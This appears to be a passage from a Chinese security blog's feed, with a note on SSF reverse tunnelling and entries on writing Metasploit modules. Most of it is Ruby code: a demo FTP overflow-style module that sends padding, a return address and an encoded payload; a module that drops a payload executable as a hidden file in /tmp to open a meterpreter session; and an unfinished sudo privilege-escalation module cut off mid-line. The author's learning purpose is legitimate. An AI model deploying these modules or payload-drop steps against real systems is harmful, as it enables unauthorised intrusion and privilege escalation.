-<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span><br><br>【内部机器连接外网机器的ip，反向连接】<br>./upx-ssf -F 本地要开放的端口 -<span class="hljs-selector-tag">p</span> ssf服务器的端口 ssf服务器IP <br>./upx-ssf -F <span class="hljs-number">1081</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1080</span> ssf服务器IP<br><br>【外部机器】<br>proxychains配置<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1081</span> <br></code></pre></div></td></tr></table></figure><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="https://exposedholes.co.uk/2019/10/27/pivoting-on-windows-secure-socket-funneling/">https://exposedholes.co.uk/2019/10/27/pivoting-on-windows-secure-socket-funneling/</a></p><p><a href="https://securesocketfunneling.github.io/ssf/#home">https://securesocketfunneling.github.io/ssf/#home</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01-msf的exp模块</title>
    <link href="/2020/12/27/04-x/"/>
    <url>/2020/12/27/04-x/</url>
    
    <content type="html"><![CDATA[<p>分为4个部分</p><ol><li><p>class 定义类，导入的msf的类，叫mixins</p></li><li><p> include 导入函数库</p></li><li><p>初始化，定义参数，模块的值</p></li><li><p>定义要执行的exp</p></li></ol><p>如果语法写错了，可以在日志里看: /root/.msf4/logs/framework.log</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-27-04/1.PNG" alt="1"></p><h2 id="写的demo，作用是调用tcp模块，进行ftp连接"><a href="#写的demo，作用是调用tcp模块，进行ftp连接" class="headerlink" title="写的demo，作用是调用tcp模块，进行ftp连接"></a>写的demo，作用是调用tcp模块，进行ftp连接</h2><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Exploit::<span class="hljs-title">Remote</span></span><br><br>  Rank = ExcellentRanking<br><br>  <span class="hljs-keyword">include</span> Msf::Exploit::Seh<br>  <span class="hljs-keyword">include</span> Msf::Exploit::Egghunter<br>  <span class="hljs-keyword">include</span> Msf::Exploit::Tcp<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = &#123;&#125;)</span></span><br>    <span class="hljs-keyword">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>           =&gt; <span class="hljs-string">&#x27;whale_tcp_connect_test&#x27;</span>,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>    =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">        tcp connect</span><br><span class="hljs-string">      &#125;</span>,<br>      <span class="hljs-string">&#x27;License&#x27;</span>        =&gt; MSF_LICENSE,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>         =&gt; [<span class="hljs-string">&#x27;whale3070&#x27;</span>],<br>      <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2020-12-27&#x27;</span>,<br>      <span class="hljs-string">&#x27;References&#x27;</span>     =&gt;<br>        [<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html&#x27;</span>]<br>        ],<br>      <span class="hljs-string">&#x27;Platform&#x27;</span>       =&gt; [<span class="hljs-string">&#x27;linux&#x27;</span>],<br>      <span class="hljs-string">&#x27;Arch&#x27;</span>           =&gt;<br>        [<br>          ARCH_X86,<br>          ARCH_X64,<br>          ARCH_ARMLE,<br>          ARCH_AARCH64,<br>          ARCH_PPC,<br>          ARCH_MIPSLE,<br>          ARCH_MIPSBE<br>        ],<br>      <span class="hljs-string">&#x27;SessionTypes&#x27;</span>   =&gt; [<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;meterpreter&#x27;</span>],<br>      <span class="hljs-string">&#x27;Targets&#x27;</span>        =&gt; [[<span class="hljs-string">&#x27;Auto&#x27;</span>, &#123;&#125;]],<br>      <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt;<br>        &#123;<br>          <span class="hljs-string">&#x27;PrependSetresuid&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;PrependSetresgid&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;PrependFork&#x27;</span>      =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;WfsDelay&#x27;</span>         =&gt; <span class="hljs-number">30</span><br>        &#125;,<br>      <span class="hljs-string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="hljs-number">0</span>))<br>    register_options( <br>      [<br>      Opt::RPORT(<span class="hljs-number">21</span>),<br>      ],<span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span></span><br>    connect<br>    buf = rand_text_alpha(<span class="hljs-number">1024</span>)<br>    buf &lt;&lt; [ target.ret ].pack(<span class="hljs-string">&#x27;V&#x27;</span>)<br>    buf &lt;&lt; payload.encoded<br>    <br>    sock.put(buf)<br>    sock.get_once<br>    <br>    handler<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>metasploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02-建立一个新的session</title>
    <link href="/2020/12/27/10-x/"/>
    <url>/2020/12/27/10-x/</url>
    
    <content type="html"><![CDATA[<h1 id="msf-建立一个新的session"><a href="#msf-建立一个新的session" class="headerlink" title="msf 建立一个新的session"></a>msf 建立一个新的session</h1><h2 id="new-session-rb"><a href="#new-session-rb" class="headerlink" title="new_session.rb"></a>new_session.rb</h2><p>作用是建立一个新的meterpreter session</p><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Exploit::<span class="hljs-title">Local</span></span><br>  Rank = ExcellentRanking<br><br>  <span class="hljs-keyword">include</span> Msf::Post::File<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::Kernel<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::Priv<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::System<br>  <span class="hljs-keyword">include</span> Msf::Exploit::EXE<br>  <span class="hljs-keyword">include</span> Msf::Exploit::FileDropper<br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = &#123;&#125;)</span></span><br>    <span class="hljs-keyword">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>           =&gt; <span class="hljs-string">&#x27;new meterpreter session&#x27;</span>,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>    =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">        generate new meterpreter session</span><br><span class="hljs-string">      &#125;</span>,<br>      <span class="hljs-string">&#x27;License&#x27;</span>        =&gt; MSF_LICENSE,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>         =&gt;<br>        [<br>          <span class="hljs-string">&#x27;whale3070&#x27;</span>   <span class="hljs-comment"># Metasploit</span><br>        ],<br>      <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2019-03-24&#x27;</span>,<br>      <span class="hljs-string">&#x27;Platform&#x27;</span>       =&gt; [<span class="hljs-string">&#x27;linux&#x27;</span>],<br>      <span class="hljs-string">&#x27;Arch&#x27;</span>           =&gt;<br>        [<br>          ARCH_X86,<br>          ARCH_X64,<br>          ARCH_ARMLE,<br>          ARCH_AARCH64,<br>          ARCH_PPC,<br>          ARCH_MIPSLE,<br>          ARCH_MIPSBE<br>        ],<br>      <span class="hljs-string">&#x27;SessionTypes&#x27;</span>   =&gt; [<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;meterpreter&#x27;</span>],<br>      <span class="hljs-string">&#x27;Targets&#x27;</span>        =&gt; [[<span class="hljs-string">&#x27;Auto&#x27;</span>, &#123;&#125;]],<br>      <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt;<br>        &#123;<br>          <span class="hljs-string">&#x27;PrependSetresuid&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;PrependSetresgid&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;PrependFork&#x27;</span>      =&gt; <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&#x27;WfsDelay&#x27;</span>         =&gt; <span class="hljs-number">30</span><br>        &#125;,<br>      <span class="hljs-string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="hljs-number">0</span>))<br>    register_options [<br>      OptInt.new(<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Process injection timeout (seconds)&#x27;</span>, <span class="hljs-string">&#x27;30&#x27;</span>])<br>    ]<br>    register_advanced_options [<br>      OptBool.new(<span class="hljs-string">&#x27;ForceExploit&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Override check result&#x27;</span>, <span class="hljs-literal">false</span>]),<br>      OptString.new(<span class="hljs-string">&#x27;WritableDir&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;A directory where we can write files&#x27;</span>, <span class="hljs-string">&#x27;/tmp&#x27;</span>])<br>    ]<br>  <span class="hljs-keyword">end</span><br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_dir</span></span><br>    datastore[<span class="hljs-string">&#x27;WritableDir&#x27;</span>].to_s<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">timeout</span></span><br>    datastore[<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>]<br>  <span class="hljs-keyword">end</span><br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">(path, data)</span></span><br>    print_status <span class="hljs-string">&quot;Writing &#x27;<span class="hljs-subst">#&#123;path&#125;</span>&#x27; (<span class="hljs-subst">#&#123;data.size&#125;</span> bytes) ...&quot;</span><br>    rm_f path<br>    write_file path, data<br>    register_file_for_cleanup path<br>  <span class="hljs-keyword">end</span><br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span></span><br>        <span class="hljs-comment"># Upload payload</span><br>    <span class="hljs-variable">@payload_path</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;base_dir&#125;</span>/.<span class="hljs-subst">#&#123;rand_text_alphanumeric <span class="hljs-number">10</span>..<span class="hljs-number">15</span>&#125;</span>&quot;</span><br>    upload <span class="hljs-variable">@payload_path</span>, generate_payload_exe<br>  <span class="hljs-keyword">end</span><br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_new_session</span><span class="hljs-params">(session)</span></span><br>    <span class="hljs-keyword">if</span> session.type.eql? <span class="hljs-string">&#x27;meterpreter&#x27;</span><br>      session.core.use <span class="hljs-string">&#x27;stdapi&#x27;</span> <span class="hljs-keyword">unless</span> session.ext.aliases.<span class="hljs-keyword">include</span>? <span class="hljs-string">&#x27;stdapi&#x27;</span><br>      session.fs.file.rm <span class="hljs-variable">@payload_path</span><br>    <span class="hljs-keyword">else</span><br>      session.shell_command_token <span class="hljs-string">&quot;rm -f &#x27;<span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_path</span>&#125;</span>&#x27;&quot;</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">ensure</span><br>    <span class="hljs-keyword">super</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><p>todo: 参考exploit/linux/local/ptrace_sudo_token_priv_esc，编写一个check函数，进行提权检查，然后run函数，进行提权利用。</p><h2 id="sudo提权模块"><a href="#sudo提权模块" class="headerlink" title="sudo提权模块"></a>sudo提权模块</h2><p>写了一天，本来打算提权成功以后，获得一个root权限的meterpreter session，但是失败了。</p><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Post</span><br><br>  <span class="hljs-keyword">include</span> Msf::Post::File<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::Kernel<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::Priv<br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::Report<br>  <span class="hljs-keyword">include</span> Msf::Post::Linux::System<br>  <span class="hljs-keyword">include</span> Msf::Exploit::EXE<br>  <span class="hljs-keyword">include</span> Msf::Exploit::FileDropper<br>  <span class="hljs-comment">#include Msf::Exploit::Local</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = &#123;&#125;)</span></span><br>    <span class="hljs-keyword">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>          =&gt; <span class="hljs-string">&#x27;Sudo Commands&#x27;</span>,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>   =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">        This module examines the sudoers configuration for the session user</span><br><span class="hljs-string">        and lists the commands executable via sudo.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        This module also inspects each command and reports potential avenues</span><br><span class="hljs-string">        for privileged code execution due to poor file system permissions or</span><br><span class="hljs-string">        permitting execution of executables known to be useful for privesc,</span><br><span class="hljs-string">        such as utilities designed for file read/write, user modification,</span><br><span class="hljs-string">        or execution of arbitrary operating system commands.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Note, you may need to provide the password for the session user.</span><br><span class="hljs-string">      &#125;</span>,<br>      <span class="hljs-string">&#x27;License&#x27;</span>       =&gt; MSF_LICENSE,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>        =&gt; [ <span class="hljs-string">&#x27;whale3070&#x27;</span> ],<br>      <span class="hljs-string">&#x27;Platform&#x27;</span>      =&gt; [ <span class="hljs-string">&#x27;bsd&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-string">&#x27;osx&#x27;</span>, <span class="hljs-string">&#x27;solaris&#x27;</span>, <span class="hljs-string">&#x27;unix&#x27;</span> ],<br>      <span class="hljs-string">&#x27;SessionTypes&#x27;</span>  =&gt; [ <span class="hljs-string">&#x27;meterpreter&#x27;</span>, <span class="hljs-string">&#x27;shell&#x27;</span> ]<br>    ))<br>    register_options [<br>      OptString.new(<span class="hljs-string">&#x27;SUDO_PATH&#x27;</span>, [ <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Path to sudo executable&#x27;</span>, <span class="hljs-string">&#x27;/usr/bin/sudo&#x27;</span> ]),<br>      OptString.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [ <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Password for the current user&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> ]),<br>      OptInt.new(<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Process injection timeout (seconds)&#x27;</span>, <span class="hljs-string">&#x27;30&#x27;</span>])<br>    ]<br>    register_advanced_options [<br>      OptBool.new(<span class="hljs-string">&#x27;ForceExploit&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Override check result&#x27;</span>, <span class="hljs-literal">false</span>]),<br>      OptString.new(<span class="hljs-string">&#x27;WritableDir&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;A directory where we can write files&#x27;</span>, <span class="hljs-string">&#x27;/tmp&#x27;</span>])<br>    ]<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sudo_path</span></span><br>    datastore[<span class="hljs-string">&#x27;SUDO_PATH&#x27;</span>].to_s<br>  <span class="hljs-keyword">end</span><br>  <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_dir</span></span><br>    datastore[<span class="hljs-string">&#x27;WritableDir&#x27;</span>].to_s<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">timeout</span></span><br>    datastore[<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>]<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">password</span></span><br>    datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>].to_s<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_executable?</span><span class="hljs-params">(path)</span></span><br>    cmd_exec(<span class="hljs-string">&quot;test -x &#x27;<span class="hljs-subst">#&#123;path&#125;</span>&#x27; &amp;&amp; echo true&quot;</span>).<span class="hljs-keyword">include</span>? <span class="hljs-string">&#x27;true&#x27;</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">eop_bins</span></span><br>    <span class="hljs-string">%w[</span><br><span class="hljs-string">      ash bash</span><br><span class="hljs-string">    ]</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">(path, data)</span></span><br>    print_status <span class="hljs-string">&quot;Writing &#x27;<span class="hljs-subst">#&#123;path&#125;</span>&#x27; (<span class="hljs-subst">#&#123;data.size&#125;</span> bytes) ...&quot;</span><br>    rm_f path<br>    write_file path, data<br>    register_file_for_cleanup path<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-comment"># Check if a sudo command offers prvileged code execution</span><br>  <span class="hljs-comment">#</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_eop</span><span class="hljs-params">(cmd)</span></span><br>    <span class="hljs-comment"># drop args for simplicity (at the risk of false positives)</span><br>    cmd = 